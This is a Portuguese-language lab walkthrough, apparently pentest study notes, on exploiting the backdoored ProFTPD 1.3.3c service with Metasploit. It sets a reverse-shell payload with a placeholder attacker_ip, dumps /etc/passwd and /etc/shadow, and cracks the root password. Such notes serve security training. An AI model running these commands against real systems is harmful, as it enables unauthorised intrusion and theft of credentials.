# Linux Hash Dump via Metasploit (ProFTPD Backdoor)

## Visão Geral

Após explorar um serviço vulnerável (ex: ProFTPD backdoor), é possível usar **módulos pós-exploração do Metasploit** para:

- dump de hashes Linux
    
- crack automático
    
- obter senha root
    

---

## Passo 1 — Verificar Conectividade

```bash
ping -c 4 target
```

---

## Passo 2 — Scan Inicial

```bash
nmap -sS -sV target
```

Exemplo encontrado:

```text
ProFTPD 1.3.3c
```

---

## Passo 3 — Verificar Vulnerabilidade

```bash
nmap --script vuln -p 21 target
```

Resultado:

```text
Backdoored ProFTPD detected
```

---

## Passo 4 — Iniciar PostgreSQL

Metasploit armazena loot no banco.

```bash
/etc/init.d/postgresql start
```

---

## Passo 5 — Explorar Backdoor

```bash
msfconsole -q
use exploit/unix/ftp/proftpd_133c_backdoor
set payload payload/cmd/unix/reverse
set RHOSTS target
set LHOST attacker_ip
exploit -z
```

Resultado:

- sessão criada
    

---

## Passo 6 — Dump Hashes Linux

```bash
use post/linux/gather/hashdump
set SESSION 1
exploit
```

Isso extrai:

- `/etc/passwd`
    
- `/etc/shadow`
    

---

## Passo 7 — Crack Automático

```bash
use auxiliary/analyze/crack_linux
set SHA512 true
run
```

Resultado:

```text
root:password
```

---

## Fluxo de Exploração

1. Enumerar serviço
    
2. Explorar vulnerabilidade
    
3. Obter sessão
    
4. Dump hashes
    
5. Crack automático
    
6. Obter senha root
    

---

## Arquivos Alvo

```text
/etc/passwd
/etc/shadow
```

---

## Módulos Metasploit Usados

```text
exploit/unix/ftp/proftpd_133c_backdoor
post/linux/gather/hashdump
auxiliary/analyze/crack_linux
```

---

## Comandos Importantes

```bash
nmap -sV target
use exploit/unix/ftp/proftpd_133c_backdoor
use post/linux/gather/hashdump
use auxiliary/analyze/crack_linux
```

---

## Resultado

Senha root obtida:

```text
password
```

---

## Resumo

Após explorar ProFTPD backdoor, é possível usar módulos pós-exploração do Metasploit para **dump e crack de hashes Linux**, obtendo acesso root.

---